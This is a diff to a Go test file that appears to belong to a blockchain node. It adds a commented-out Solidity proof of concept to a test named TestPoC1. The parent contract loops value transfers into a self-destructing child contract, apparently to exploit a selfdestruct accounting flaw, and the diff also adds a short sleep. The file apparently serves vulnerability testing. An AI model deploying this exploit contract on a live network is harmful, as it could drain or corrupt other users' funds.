@@ -97,6 +97,27 @@ func submitTrxAsync(wallet *web3.Wallet, trx *types2.Trx) []byte {
 	return requestHttp(defaultRpcNode.RPCURL + "/broadcast_tx_async?tx=0x" + hex.EncodeToString(encode))
 }
 
+/*
+contract child {
+    constructor () payable {}
+    fallback () external payable {
+        if(msg.value > 0) return;
+        selfdestruct(payable(address(msg.sender)));
+    }
+}
+
+contract parent {
+    constructor () payable {
+        address g = address(new child{value: msg.value}());
+        for(uint i=0;i<100;i++){
+            g.call("");
+            g.call{value: address(this).balance}("");
+        }
+        g.call("");
+        selfdestruct(payable(address(msg.sender)));
+    }
+} */
+
 func TestPoC1(t *testing.T) {
 	wallet := randWallet()
 	require.NoError(t, wallet.Unlock(defaultRpcNode.Pass))
@@ -127,6 +148,8 @@ func TestPoC1(t *testing.T) {
 	trxObj := web3.NewTrxContract(fromAddr, types.ZeroAddress(), nonce, gasEncode, copyAmtEncode, selfdestructContract)
 	submitTrx(wallet, trxObj)
 	//fmt.Printf("%s\n", submitTrx(wallet, trxObj))
+
+	time.Sleep(time.Second)
 
 	fmt.Println("[after]")
 	sdContractAddr := crypto.CreateAddress(wallet.Address().Array20(), nonce)
